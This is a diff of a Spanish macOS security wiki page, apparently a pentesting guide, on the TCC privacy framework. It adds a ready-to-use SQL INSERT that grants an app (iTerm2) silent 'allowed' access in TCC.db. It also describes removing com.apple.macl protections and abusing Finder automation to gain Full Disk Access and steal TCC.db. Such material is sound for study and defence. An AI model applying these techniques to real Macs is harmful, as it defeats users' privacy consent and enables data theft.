@@ -32,22 +32,22 @@ ps -ef | grep tcc
 0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
 501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
 ```
-Los permisos se heredan de la aplicación padre y se rastrean en función del ID de paquete y el ID de desarrollador.
+Los permisos se heredan de la aplicación principal y se rastrean en función del ID de paquete y el ID de desarrollador.
 
 ### Bases de datos de TCC
 
 Las selecciones se almacenan en la base de datos de TCC en todo el sistema en **`/Library/Application Support/com.apple.TCC/TCC.db`** o en **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para las preferencias por usuario. Las bases de datos están protegidas contra la edición con SIP (Protección de Integridad del Sistema), pero se pueden leer.
 
 {% hint style="danger" %}
-La base de datos de TCC en iOS se encuentra en **`/private/var/mobile/Library/TCC/TCC.db`**
+La base de datos de TCC en **iOS** se encuentra en **`/private/var/mobile/Library/TCC/TCC.db`**
 {% endhint %}
 
 Hay una tercera base de datos de TCC en **`/var/db/locationd/clients.plist`** para indicar los clientes permitidos para acceder a los servicios de ubicación.
 
-Además, un proceso con acceso completo al disco puede editar la base de datos en modo de usuario. Ahora, una aplicación también necesita FDA o `kTCCServiceEndpointSecurityClient` para leer la base de datos (y modificar la base de datos de usuarios).
+Además, un proceso con **acceso completo al disco** puede editar la base de datos en modo de usuario. Ahora, una aplicación también necesita **FDA** o **`kTCCServiceEndpointSecurityClient`** para leer la base de datos (y modificar la base de datos de usuarios).
 
 {% hint style="info" %}
-La interfaz de usuario del centro de notificaciones puede realizar cambios en la base de datos de TCC del sistema:
+La interfaz de usuario del **centro de notificaciones** puede realizar cambios en la base de datos de TCC del sistema:
 
 {% code overflow="wrap" %}
 ```bash
@@ -165,7 +165,7 @@ La **base de datos** de TCC almacena el **ID del paquete** de la aplicación, pe
 {% code overflow="wrap" %}
 ```bash
 # From sqlite
-sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
+sqlite> select service, client, hex(csreq) from access where auth_value=2;
 #Get csreq
 
 # From bash
@@ -232,13 +232,55 @@ Es curioso que el atributo **`com.apple.macl`** sea gestionado por el **Sandbox*
 También ten en cuenta que si mueves un archivo que permite el UUID de una aplicación en tu computadora a una computadora diferente, debido a que la misma aplicación tendrá diferentes UIDs, no otorgará acceso a esa aplicación.
 {% endhint %}
 
-El atributo extendido `com.apple.macl` **no se puede borrar** como otros atributos extendidos porque está **protegido por SIP**. Sin embargo, como se explica en [**esta publicación**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), es posible deshabilitarlo **comprimiendo** el archivo, **borrándolo** y **descomprimiéndolo**.
+El atributo extendido `com.apple.macl` **no se puede borrar** como otros atributos extendidos porque está **protegido por SIP**. Sin embargo, como se explica en [**esta publicación**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), es posible desactivarlo **comprimiendo** el archivo, **borrándolo** y **descomprimiéndolo**.
 
-## Privilegios de TCC y Bypasses
+## Privilegios elevados y bypasses de TCC
 
-### Escalada de privilegios de Automatización a FDA
+### Insertar en TCC
 
-**Finder** es una aplicación que **siempre tiene FDA** (incluso si no aparece en la interfaz de usuario), por lo que si tienes privilegios de **Automatización** sobre ella, puedes abusar de sus privilegios para **realizar algunas acciones**.
+Si en algún momento logras obtener acceso de escritura sobre una base de datos de TCC, puedes usar algo como lo siguiente para agregar una entrada (eliminar los comentarios):
+```
+INSERT INTO access (
+service,
+client,
+client_type,
+auth_value,
+auth_reason,
+auth_version,
+csreq,
+policy_id,
+indirect_object_identifier_type,
+indirect_object_identifier,
+indirect_object_code_identity,
+flags,
+last_modified,
+pid,
+pid_version,
+boot_uuid,
+last_reminded
+) VALUES (
+'kTCCServiceSystemPolicyDesktopFolder', -- service
+'com.googlecode.iterm2', -- client
+0, -- client_type (0 - bundle id)
+2, -- auth_value  (2 - allowed)
+3, -- auth_reason (3 - "User Set")
+1, -- auth_version (always 1)
+X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
+NULL, -- policy_id
+NULL, -- indirect_object_identifier_type
+'UNUSED', -- indirect_object_identifier - default value
+NULL, -- indirect_object_code_identity
+0, -- flags
+strftime('%s', 'now'), -- last_modified with default current timestamp
+NULL, -- assuming pid is an integer and optional
+NULL, -- assuming pid_version is an integer and optional
+'UNUSED', -- default value for boot_uuid
+strftime('%s', 'now') -- last_reminded with default current timestamp
+);
+```
+### Escalación de privilegios desde Automatización a FDA
+
+**Finder** es una aplicación que **siempre tiene FDA** (aunque no aparezca en la interfaz de usuario), por lo que si tienes privilegios de **Automatización** sobre ella, puedes abusar de sus privilegios para **realizar algunas acciones**.
 
 {% tabs %}
 {% tab title="Robar la base de datos TCC.db de los usuarios" %}
@@ -314,15 +356,14 @@ Aquí tienes un ejemplo de cómo se ve el archivo AllowApplicationsList.plist:
 
 ```xml
 <dict>
-    <key>AllowedApplications</key>
-    <array>
-        <string>com.example.app1</string>
-        <string>com.example.app2</string>
-    </array>
+    <key>com.example.app1</key>
+    <true/>
+    <key>com.example.app2</key>
+    <true/>
 </dict>
 ```
 
-En este ejemplo, las aplicaciones "com.example.app1" y "com.example.app2" tienen permiso para acceder a los recursos protegidos por el TCC.
+En este ejemplo, las aplicaciones "com.example.app1" y "com.example.app2" tienen permiso para acceder a los recursos protegidos.
 
 Recuerda que es importante mantener actualizado este archivo y revisar regularmente las aplicaciones permitidas para garantizar la seguridad de tu sistema.
 ```xml
